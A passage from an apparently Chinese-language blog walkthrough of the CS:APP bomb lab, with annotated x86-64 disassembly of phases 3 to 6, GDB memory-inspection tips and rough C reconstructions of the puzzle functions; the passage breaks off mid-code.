class="number">1</span> <span class="number">2</span> <span class="number">4</span> <span class="number">8</span> <span class="number">16</span> <span class="number">32</span></span><br></pre></td></tr></table></figure>

<h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    rsp,0x18</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    rcx,[rsp+0xc]           ;参数4     0x00</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    rdx,[rsp+0x8]           ;参数3</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    esi,0x4025cf            ;参数2查看之后是%d，诡异的是接收两个整形</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    eax,0x0                 ;应该是个计数器</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	call   400bf0 &lt;__isoc99_sscanf@plt&gt;；读取我们的input作为scand的参数</span><br><span class="line">  400f60:	83 f8 01             	cmp    eax,0x1                 ;eax里的值和1比较，eax存放的是函数的返回值</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;   ;如果大于一则跳转     jg是由符号运算大于则跳转</span><br><span class="line">  400f65:	e8 d0 04 00 00       	call   40143a &lt;explode_bomb&gt;   ;不大于一直接爆炸</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmp    DWORD PTR [rsp+0x8],0x7 ;调准到此处，与0x7进行比较</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;   ;无符号大于则跳转，爆炸</span><br><span class="line">  400f71:	8b 44 24 08          	mov    eax,DWORD PTR [rsp+0x8] </span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmp    QWORD PTR [rax*8+0x402470];用x/x查明之后，是机器码0xb9，对应的汇编指令是MOV cx,immed16</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    eax,0xcf</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    eax,0x2c3</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    eax,0x100</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    eax,0x185</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    eax,0xce</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    eax,0x2aa</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    eax,0x147</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    eax,0x137</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    eax,DWORD PTR [rsp+0xc]</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    rsp,0x18</span><br><span class="line">  400fcd:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>通过传到esi里的参数我们可以看出，这次接受的输入是两个整形，下面一堆东西是属比较抽象，静态看实在有点头大，于是多下了几个断点一步一步来，输入2 2尝试一下。cmp eax，0x1，eax里保存的是返回值，只要我们的输入大于一个应该就能正常跳转，下面的比较没太看明白，和0x7进行比较，试一下就知道，其实是和我们的第一个输入进行比较，只要不大于7就能正常跳转，我们接着向下，一步一步调试来到了最后的比较，cmp    eax,DWORD PTR [rsp+0xc]，很容易想到[rsp+0xc]其实就是我们的第二个输入，这是只要我们查看一下寄存器的值，就知道如何进行比较<img src="/2023/06/02/bomblab/QQ%E6%88%AA%E5%9B%BE20230425212410.png"></p>
<p>可以看到rax的值为707，推出之后重新运行，输入2 707果然正确。通过这题目的名字可以看出他考察的是分支，关键的没看懂的地方其实是jmp    QWORD PTR [rax*8+0x402470]，这一步大概率是根据我们的输入进行不同的跳转的函数。至于我们的输入为什么被放在了[rsp,0xc]和[rsp+0x8]中，我的猜测是这是函数的参数用来指定将接收的输入放置的位置。 __isoc99_sscanf@plt(rdi,rsi,n1,n2,n3…)其中参数rdi保存的是我们input里的输入，rsi保存的是%d之类的，以什么形式接收多少，后面就是放置的位置吧。</p>
<p>看了网上的题解之后，才明白这原来就是个switch分支啊，我们可以通过x命令来查看一下0x402470的内容，这是个跳转表，在《汇编语言》接触过</p>
<p>通过x&#x2F;8xg<img src="/2023/06/02/bomblab/QQ%E6%88%AA%E5%9B%BE20230425222247.png"></p>
<p>细说一下x命令，很好用。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">格式        x/nfu  addr</span><br><span class="line">n是正数表示要显示的数量</span><br><span class="line">f该表的是输出格式，常用的有字符串s，十六进制x，十进制d，字符c</span><br><span class="line">u代表一多少个字节作为一个内存单元来显示，<span class="attribute">b</span>=1byte,h=2 bytes,<span class="attribute">w</span>=4 bytes,<span class="attribute">g</span>=8 bytes</span><br><span class="line">addr代表内存单元地址</span><br><span class="line"> x/8xg 0x402470</span><br><span class="line">这条指令的意思就是从内存地址0x402470处，以十六进制形式8个字节为一个单位显示8组数</span><br><span class="line">为什么这里要用8呢，因为跳转那里是qword也就是两个字，一个字32为两个字就是8字节</span><br></pre></td></tr></table></figure>

<h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    rsp,0x8</span><br><span class="line">  400fd2:	89 d0                	mov    eax,edx  ;0x0e</span><br><span class="line">  400fd4:	29 f0                	sub    eax,esi  ;0x0</span><br><span class="line">  400fd6:	89 c1                	mov    ecx,eax   </span><br><span class="line">  400fd8:	c1 e9 1f             	shr    ecx,0x1f  ;右移0x1f</span><br><span class="line">  400fdb:	01 c8                	add    eax,ecx   ;</span><br><span class="line">  400fdd:	d1 f8                	sar    eax,1     ;算术右移</span><br><span class="line">  400fdf:	8d 0c 30             	lea    ecx,[rax+rsi*1]   ;</span><br><span class="line">  400fe2:	39 f9                	cmp    ecx,edi</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;      ;有符号小于等于</span><br><span class="line">  400fe6:	8d 51 ff             	lea    edx,[rcx-0x1]</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	call   400fce &lt;func4&gt;      ;调用自身  递归</span><br><span class="line">  400fee:	01 c0                	add    eax,eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">  400ff7:	39 f9                	cmp    ecx,edi</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;;有符号大于等于</span><br><span class="line">  400ffb:	8d 71 01             	lea    esi,[rcx+0x1]</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	call   400fce &lt;func4&gt;</span><br><span class="line">  401003:	8d 44 00 01          	lea    eax,[rax+rax*1+0x1]</span><br><span class="line">  401007:	48 83 c4 08          	add    rsp,0x8</span><br><span class="line">  40100b:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    rsp,0x18</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    rcx,[rsp+0xc]      ;第二个输入</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    rdx,[rsp+0x8]      ;第一个输入</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    esi,0x4025cf       ;接收两个整型</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">  401024:	e8 c7 fb ff ff       	call   400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    eax,0x2            ;如果输入不为2就爆炸</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmp    DWORD PTR [rsp+0x8],0xe  ;第一个输入和0xe进行比较</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;    ;无符号小于等于则跳转，所以我们的输入必须小于等于14</span><br><span class="line">  401035:	e8 00 04 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    edx,0xe</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    esi,0x0</span><br><span class="line">  401044:	8b 7c 24 08          	mov    edi,DWORD PTR [rsp+0x8]   ;------------函数传参</span><br><span class="line">  401048:	e8 81 ff ff ff       	call   400fce &lt;func4&gt;      ;调用func4</span><br><span class="line">  40104d:	85 c0                	test   eax,eax            ;and操作不过不改变不敌寄存器的值，为0时标志寄存器置0</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;    ;如果上面eax的值为0则不发生跳转（哦按段是否相等是检测其差是否为0）</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmp    DWORD PTR [rsp+0xc],0x0   ;将第二个参数与0进行比较</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;      ;相等则成功，否则爆炸！！！</span><br><span class="line">  401058:	e8 dd 03 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    rsp,0x18</span><br><span class="line">  401061:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>看着汇编用c语言大致实现了一遍。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span> di, <span class="type">int</span> si, <span class="type">int</span> dx)</span><span class="comment">//</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ax = dx;</span><br><span class="line">    ax = ax - si;</span><br><span class="line">    <span class="type">int</span> cx = ax;</span><br><span class="line">    cx = cx &gt;&gt; <span class="number">0x1f</span>; <span class="comment">//逻辑</span></span><br><span class="line">    ax = ax + cx;</span><br><span class="line">    ax = ax &gt;&gt; <span class="number">1</span>; <span class="comment">//算数</span></span><br><span class="line">    cx = (ax + si);</span><br><span class="line">    <span class="keyword">if</span> (cx &lt;= di)</span><br><span class="line">    &#123;</span><br><span class="line">        ax = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (cx &gt;= di)</span><br><span class="line">            <span class="keyword">return</span> ax;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            si = (cx + <span class="number">1</span>);</span><br><span class="line">            ax=func4(di, si, dx);</span><br><span class="line">            ax = (ax + ax + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ax;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dx = (cx - <span class="number">1</span>);</span><br><span class="line">        ax = func4(di, si, dx);</span><br><span class="line">        ax = ax+ax;</span><br><span class="line">        <span class="keyword">return</span> ax;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> g = <span class="number">0</span>;</span><br><span class="line">    scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;g);</span><br><span class="line">    <span class="keyword">if</span> (i &lt;= <span class="number">0xe</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">        <span class="type">int</span> x=func4(i, <span class="number">0</span>, <span class="number">0xe</span>);</span><br><span class="line">        <span class="keyword">if</span> (x != <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;bomb!!&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">if</span> (g == <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;success!!!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;bomb!!!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bomb&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本来tmd早就可以结束的，在test那里出了点问题，test eax,eax; jne bomb 意思是如果返回值eax的值为零，那么爆炸，woc简直了，把c语言的判断写成了         if（ex&#x3D;&#x3D;0）则爆炸。。。这一题的解题思路不同于上两个，是直接通过代码实现的，经过验证（0~14）其中可行的是0，1，3，7第二个输入是固定的0。</p>
<h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    rsp,0x20</span><br><span class="line">  401067:	48 89 fb             	mov    rbx,rdi</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    QWORD PTR [rsp+0x18],rax</span><br><span class="line">  401078:	31 c0                	xor    eax,eax</span><br><span class="line">  40107a:	e8 9c 02 00 00       	call   40131b &lt;string_length&gt; </span><br><span class="line">  40107f:	83 f8 06             	cmp    eax,0x6                ;如果输入的字符串长度不等于6，则爆炸</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;      </span><br><span class="line">  401084:	e8 b1 03 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  40108b:	0f b6 0c 03          	movzx  ecx,BYTE PTR [rbx+rax*1]     ;将我们的输入逐字节传送到ecx</span><br><span class="line">  40108f:	88 0c 24             	mov    BYTE PTR [rsp],cl            ;送入【rsp】</span><br><span class="line">  401092:	48 8b 14 24          	mov    rdx,QWORD PTR [rsp]          ;送入rdx</span><br><span class="line">  401096:	83 e2 0f             	and    edx,0xf                      ;将我们的输入and上0xf</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzx  edx,BYTE PTR [rdx+0x4024b0]       ;把该地址处的值存入edx，0扩展并传送（无符号扩展）到edx</span><br><span class="line">  4010a0:	88 54 04 10          	mov    BYTE PTR [rsp+rax*1+0x10],dl       ;将修改过的输入传入指定位置</span><br><span class="line">  4010a4:	48 83 c0 01          	add    rax,0x1                          ;eax+1</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    rax,0x6                           ;eax的值与6进行比较</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;             ;因为在前面eax已经置零，所以这里就是循环六次上面的操作</span><br><span class="line">  4010ae:	c6 44 24 16 00       	mov    BYTE PTR [rsp+0x16],0x0         ;向指定位置送个0，像是结尾标志</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    esi,0x40245e                    ;将比较字符串“flyers”送入</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    rdi,[rsp+0x10]                  ;</span><br><span class="line">  4010bd:	e8 76 02 00 00       	call   401338 &lt;strings_not_equal&gt;        ;如果不相等则为真返回1否则返回0</span><br><span class="line">  4010c2:	85 c0                	test   eax,eax                           </span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;              ;如果返回值rax为0则进行跳转，否则爆炸</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]               </span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    rax,QWORD PTR [rsp+0x18]         ;</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28            ;异或操作，实际上是进行比较，其实是进行栈溢出检测</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;            ;如果相等则异或结果为零跳转，成功。</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	call   400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:	48 83 c4 20          	add    rsp,0x20</span><br><span class="line">  4010f2:	5b                   	pop    rbx</span><br><span class="line">  4010f3:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>这里其实是个多解题目，其实输入的是六个索引值。0x4024b0那里就是字符表(在字符表后发现了隐藏的炸弹好阴险)，最后的栈溢出检测浪费了很长时间，应该就是将其和金丝雀值进行对比，通过调试也可以看出，栈是随机化的。</p>
<h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:	41 56                	push   r14</span><br><span class="line">  4010f6:	41 55                	push   r13</span><br><span class="line">  4010f8:	41 54                	push   r12</span><br><span class="line">  4010fa:	55                   	push   rbp</span><br><span class="line">  4010fb:	53                   	push   rbx</span><br><span class="line">  4010fc:	48 83 ec 50          	sub    rsp,0x50</span><br><span class="line">  401100:	49 89 e5             	mov    r13,rsp</span><br><span class="line">  401103:	48 89 e6             	mov    rsi,rsp      ;第二个参数  存放输入的首地址</span><br><span class="line">  401106:	e8 51 03 00 00       	call   40145c &lt;read_six_numbers&gt;</span><br><span class="line">  40110b:	49 89 e6             	mov    r14,rsp      ;将栈顶地址赋值给r14</span><br><span class="line">  40110e:	41 bc 00 00 00 00    	mov    r12d,0x0     ;</span><br><span class="line">  401114:	4c 89 ed             	mov    rbp,r13      ;将栈顶地址赋值给rbp</span><br><span class="line">  401117:	41 8b 45 00          	mov    eax,DWORD PTR [r13+0x0]   ;把输入1送入eax</span><br><span class="line">  40111b:	83 e8 01             	sub    eax,0x1          ;将eax减去1</span><br><span class="line">  40111e:	83 f8 05             	cmp    eax,0x5          ;和5进行比较</span><br><span class="line">  401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt;  ;无符号小于等于跳转</span><br><span class="line">  401123:	e8 12 03 00 00       	call   40143a &lt;explode_bomb&gt;  ;第一个输入不能大于6</span><br><span class="line">  401128:	41 83 c4 01          	add    r12d,0x1      ;给计数器加1</span><br><span class="line">  40112c:	41 83 fc 06          	cmp    r12d,0x6      ;与6进行比较</span><br><span class="line">  401130:	74 21                	je     401153 &lt;phase_6+0x5f&gt; ;相等则跳转</span><br><span class="line">  401132:	44 89 e3             	mov    ebx,r12d     ;</span><br><span class="line">  401135:	48 63 c3             	movsxd rax,ebx      ;符号扩展</span><br><span class="line">  401138:	8b 04 84             	mov    eax,DWORD PTR [rsp+rax*4];将输入送入eax</span><br><span class="line">  40113b:	39 45 00             	cmp    DWORD PTR [rbp+0x0],eax;与输入1进行对比</span><br><span class="line">  40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt;;不相等跳转</span><br><span class="line">  401140:	e8 f5 02 00 00       	call   40143a &lt;explode_bomb&gt;;相等爆炸</span><br><span class="line">  401145:	83 c3 01             	add    ebx,0x1  ;2</span><br><span class="line">  401148:	83 fb 05             	cmp    ebx,0x5   ;比较，循环5次知道ebx=6</span><br><span class="line">  40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt; ;有符号小于等于跳转</span><br><span class="line">  40114d:	49 83 c5 04          	add    r13,0x4  ;r13指向第2个输入</span><br><span class="line">  401151:	eb c1                	jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">  401153:	48 8d 74 24 18       	lea    rsi,[rsp+0x18]   ;第六个输入的后一个的地址</span><br><span class="line">  401158:	4c 89 f0             	mov    rax,r14</span><br><span class="line">  40115b:	b9 07 00 00 00       	mov    ecx,0x7</span><br><span class="line">  401160:	89 ca                	mov    edx,ecx</span><br><span class="line">  401162:	2b 10                	sub    edx,DWORD PTR [rax]</span><br><span class="line">  401164:	89 10                	mov    DWORD PTR [rax],edx</span><br><span class="line">  401166:	48 83 c0 04          	add    rax,0x4</span><br><span class="line">  40116a:	48 39 f0             	cmp    rax,rsi</span><br><span class="line">  40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt;    ;又是一个循环</span><br><span class="line">  40116f:	be 00 00 00 00       	mov    esi,0x0          </span><br><span class="line">  401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">  401176:	48 8b 52 08          	mov    rdx,QWORD PTR [rdx+0x8]</span><br><span class="line">  40117a:	83 c0 01             	add    eax,0x1</span><br><span class="line">  40117d:	39 c8                	cmp    eax,ecx</span><br><span class="line">  40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  401181:	eb 05                	jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">  401183:	ba d0 32 60 00       	mov    edx,0x6032d0</span><br><span class="line">  401188:	48 89 54 74 20       	mov    QWORD PTR [rsp+rsi*2+0x20],rdx</span><br><span class="line">  40118d:	48 83 c6 04          	add    rsi,0x4</span><br><span class="line">  401191:	48 83 fe 18          	cmp    rsi,0x18</span><br><span class="line">  401195:	74 14                	je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">  401197:	8b 0c 34             	mov    ecx,DWORD PTR [rsp+rsi*1]</span><br><span class="line">  40119a:	83 f9 01             	cmp    ecx,0x1</span><br><span class="line">  40119d:	7e e4                	jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">  40119f:	b8 01 00 00 00       	mov    eax,0x1</span><br><span class="line">  4011a4:	ba d0 32 60 00       	mov    edx,0x6032d0</span><br><span class="line">  4011a9:	eb cb                	jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  4011ab:	48 8b 5c 24 20       	mov    rbx,QWORD PTR [rsp+0x20]</span><br><span class="line">  4011b0:	48 8d 44 24 28       	lea    rax,[rsp+0x28]</span><br><span class="line">  4011b5:	48 8d 74 24 50       	lea    rsi,[rsp+0x50]</span><br><span class="line">  4011ba:	48 89 d9             	mov    rcx,rbx</span><br><span class="line">  4011bd:	48 8b 10             	mov    rdx,QWORD PTR [rax]</span><br><span class="line">  4011c0:	48 89 51 08          	mov    QWORD PTR [rcx+0x8],rdx</span><br><span class="line">  4011c4:	48 83 c0 08          	add    rax,0x8</span><br><span class="line">  4011c8:	48 39 f0             	cmp    rax,rsi</span><br><span class="line">  4011cb:	74 05                	je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">  4011cd:	48 89 d1             	mov    rcx,rdx</span><br><span class="line">  4011d0:	eb eb                	jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">  4011d2:	48 c7 42 08 00 00 00 	mov    QWORD PTR [rdx+0x8],0x0</span><br><span class="line">  4011d9:	00 </span><br><span class="line">  4011da:	bd 05 00 00 00       	mov    ebp,0x5</span><br><span class="line">  4011df:	48 8b 43 08          	mov    rax,QWORD PTR [rbx+0x8]</span><br><span class="line">  4011e3:	8b 00                	mov    eax,DWORD PTR [rax]</span><br><span class="line">  4011e5:	39 03                	cmp    DWORD PTR [rbx],eax</span><br><span class="line">  4011e7:	7d 05                	jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">  4011e9:	e8 4c 02 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:	48 8b 5b 08          	mov    rbx,QWORD PTR [rbx+0x8]</span><br><span class="line">  4011f2:	83 ed 01             	sub    ebp,0x1</span><br><span class="line">  4011f5:	75 e8                	jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">  4011f7:	48 83 c4 50          	add    rsp,0x50</span><br><span class="line">  4011fb:	5b                   	pop    rbx</span><br><span class="line">  4011fc:	5d                   	pop    rbp</span><br><span class="line">  4011fd:	41 5c                	pop    r12</span><br><span class="line">  4011ff:	41 5d                	pop    r13</span><br><span class="line">  401201:	41 5e                	pop    r14</span><br><span class="line">  401203:	c3                   	ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> arr[]=<span class="string">&quot;193456&quot;</span>;</span><br><span class="line">	<span class="type">int</span> rsp=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> ebp;</span><br><span class="line">	<span class="type">int</span> ecx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> edx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> esi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span>* r14 = arr;<span class="comment">//	mov    r14,rsp                  将输入的首地址放在r14</span></span><br><span class="line">	<span class="type">char</span>* rsp = arr;                 <span class="comment">//                 将输入的首地址放在rsp</span></span><br><span class="line">	<span class="type">int</span> r12d = <span class="number">0</span>;<span class="comment">//mov    r12d,0x0</span></span><br><span class="line">	<span class="type">char</span>* r13 = arr;                           <span class="comment">//       将输入的首地址放在r13</span></span><br><span class="line">jump401114:<span class="type">char</span>* rbp = r13;<span class="comment">//mov    rbp,r13        （第一次）首地址  （第二次）第二个输入     </span></span><br><span class="line">	<span class="type">int</span> eax = *(r13 + <span class="number">0</span>);<span class="comment">//mov    eax,DWORD PTR [r13+0x0]    将我们的一个输入放入eax中（第一个）  （第二次）第二个</span></span><br><span class="line">	eax = eax - <span class="number">1</span>;<span class="comment">//	sub    eax,0x1                       将（第一个）输入减一 我们的第一个输入必须小于等于6  （第二个也小于6）</span></span><br><span class="line">	<span class="type">int</span> ebx = <span class="number">0</span>;      </span><br><span class="line">	<span class="keyword">if</span> (eax &lt;= <span class="number">5</span>)<span class="comment">//	cmp    eax,0x5  //jbe    401128 &lt;phase_6+0x34&gt;     </span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">goto</span> jump4001128;</span><br><span class="line">		jump4001128:</span><br><span class="line">		r12d = r12d + <span class="number">1</span>;<span class="comment">//add    r12d,0x1            （第一次路过）r12d=1   第六次路过就是6啦（非常的聪明）</span></span><br><span class="line">		<span class="keyword">if</span> (r12d == <span class="number">6</span>)<span class="comment">//cmp  r12d,0x6 //je     401153 &lt;phase_6+0x5f&gt;    很明显循环五次 经历过五次循环 前数与后数不相同0123456的排列组合，满足条件则进入</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//////////////////////////////////////////////////////////////////满足初始的0~6条件进入（第一次判断）</span></span><br><span class="line">			<span class="keyword">goto</span> jump4001153;</span><br><span class="line">			jump4001153:</span><br><span class="line">			<span class="type">int</span> rsi = <span class="number">0</span>;<span class="comment">//lea    rsi,[rsp+0x18]             第六个输入的后一个地址，应该是用来结束 rsi结束地址！！！！！！！！！！</span></span><br><span class="line">			eax = *r14;<span class="comment">//	mov    rax,r14                   eax存放输入的首地址</span></span><br><span class="line">			ecx = <span class="number">0x7</span>;<span class="comment">//mov    ecx,0x7                     ecx是7</span></span><br><span class="line">jump401160: edx = ecx;<span class="comment">//	mov    edx,ecx                 （第一次）edx=7    </span></span><br><span class="line">			edx = edx - eax;<span class="comment">//sub    edx,DWORD PTR [rax]    （第一次）edx=7-input1   （第二次）edx=7-input2     （第五次）edx=7-input5  （第六次）edx=7-input6</span></span><br><span class="line">			eax = edx;<span class="comment">//mov    DWORD PTR [rax],edx           将edx的值放入input1的位置    （第二次）放到input2的位置          （第六次）input6的位置</span></span><br><span class="line">			eax = eax + <span class="number">4</span>;<span class="comment">//add    rax,0x4                   （第一次）rax指向input2   （第二次）input3    （第5次）input6       （第六次）rsi所在的位置</span></span><br><span class="line">			<span class="keyword">if</span> (eax == rsi)<span class="comment">//cmp    rax, rsi              如果eax等于最后一个输入后面的地址  </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span 